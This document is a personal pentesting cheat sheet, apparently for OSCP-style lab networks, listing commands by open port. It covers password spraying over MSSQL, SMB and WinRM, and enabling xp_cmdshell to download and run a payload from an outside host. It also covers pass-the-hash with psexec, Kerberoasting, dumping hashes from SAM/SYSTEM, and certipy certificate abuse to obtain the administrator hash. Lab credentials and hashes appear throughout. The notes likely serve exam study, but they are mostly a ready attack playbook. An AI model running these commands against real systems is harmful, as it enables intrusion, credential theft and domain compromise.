***1433 mssql open***
	`nxc mssql 10.10.159.148 -u users_updated.txt -p passwords.txt --continue-on-success`
	- spray creds at IP
	`nxc mssql 10.10.159.148 -u sql_svc -p Dolphin1 -x 'whoami /priv'`
	- `-x` for command execution
	`mssqlclient.py -windows-auth oscp.exam/sql_svc:'Dolphin1'@10.10.159.148`
	- better for command execution; allows for reverse shell
	- output:
		Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
		[*] Encryption required, switching to TLS
		[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
		[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
		[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
		[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
		[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
		[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
		[!] Press help for extra shell commands
		SQL> `use master`
		[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
		[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
		SQL> `sp_configure 'show advanced options', '1'`
		[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
		SQL> `RECONFIGURE`
		SQL> `sp_configure 'xp_cmdshell', '1'`
		[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
		SQL> `RECONFIGURE`
		SQL> `EXEC master..xp_cmdshell 'whoami'`
		nt service\mssql$sqlexpress                                                                                                                
		SQL> `exec xp_cmdshell "powershell -c iwr -uri http://10.10.126.147:83/payload_1234.exe -Outfile c:\windows\temp\payload_1234.exe"`
		SQL> `exec xp_cmdshell "powershell -c c:\windows\temp\payload_1234.exe"`
	
                                                                                                                                                                                                                                                     
***139/445 smb open***
- if you have ntlm hash (from mimikatz), but can't crack:
	- `nxc smb 10.10.126.146-148 -u 'Administrator' -H '00000000000000000000000000000000:59b280ba707d22e3ef0aa587fc29ffe5'`
- if you have smb screds:
	- `smbclient.py oscp.exam/web_svc:Diamond1@10.10.159.146`
- no creds/null session:
	- `nxc smb 192.168.x.x -u '' -p '' --shares`
	- `smbclient -L 192.168.184.248 -U guest`


- if you find a share:
	- `smbclient \\\\192.168.184.248\\Users -N`

***135 rpc open***
	- `rpcclient -U "joe%Flowers1" -c enumdomusers 172.16.247.10`
		- enumerate users

***5985/5986 winrm open***
	- `netexec winrm 10.10.126.140 -u users.txt -H hash.txt`
	- `evil-winrm -i 172.16.230.83 --user wario --pass Mushroom\!`

secretsdump

wmiexec

psexec
`psexec.py oscp.exam/administrator@10.10.138.152 -hashes '00000000000000000000000000000000:59b280ba707d22e3ef0aa587fc29ffe5'`


PSSession script to to connect to another windows device in the internal network:
	`$User = "wario"`
	`$Password = ConvertTo-SecureString "Mushroom!" -AsPlainText -Force`
	`$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password`
	`$Session = New-PSSession -ComputerName client02.medtech.com -Credential $Credential`
	`Invoke-Command -Session $Session -ScriptBlock {`
	    `hostname }`

`winrs -r:http://prod01.medtech.com:5985 -u:leon -p:"rabbit:)" "cmd"`



`impacket-GetNPUsers -dc-ip 10.10.159.146 -request -outputfile hashes.asreproast oscp.exam/web_svc:"Diamond1"`



`impacket-GetUserSPNs -dc-ip 10.10.159.146 -request -outputfile hashes.asreproast oscp.exam/web_svc:"Diamond1"`




check powershell history:
```
type C:\users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
		- also check actual folder for other files
		- check other users

Getting hashes from SAM/SYSTEM Files
	- C:\windows.old\Windows\System32\SAM
		- `download C:\windows.old\Windows\System32\SAM /home/daniel/OSCP_A/SAM`
			- evil-winrm command to download file to kali
			- make sure to include whole filepath with name of file 'SAM' at the end
	- C:\windows.old\Windows\System32\SYSTEM
		- `download C:\windows.old\Windows\System32\SYSTEM /home/daniel/OSCP_A/SYSTEM`
	- `secretsdump.py -sam SAM -system SYSTEM local`


`arp -a`


winrs

spray hashes:
`nxc winrm hosts.txt -u users.txt -H hashes.txt --continue-on-success`

search for domain certificates using certipy
```
certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.186.213 
```
- returns a bunch of info on the domain, can be put into bloodhound

if "Domain Computers" has Enrollment Rights and you have access to a domain-joined machine, search for the `krb5.keytab` file, usually stored at `/etc/krb5.keytab` on linux
- transfer to home machine and run:
```
python3 keytabextract.py krb5.keytab
```
- get the ntlm hash and use with certipy:
```
certipy req -u 'MAIL01$' -hashes ":0f916c5246fdbc7ba95dcef4126d57bd" -dc-ip "10.10.232.21" -ca 'hybrid-DC01-CA' -template 'HYBRIDCOMPUTERS' -upn 'administrator' -target 'dc01.hybrid.vl' -key-size 4096 -debug
```
- make sure IPs are listed in `/etc/hosts`
- `-template 'HYBRIDCOMPUTERS'` is from certipy.txt output file
- should save certificate and private key to administrator.pfx
```
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.232.21
```
- get administrator hash to PTH with evil-winrm or whichever shell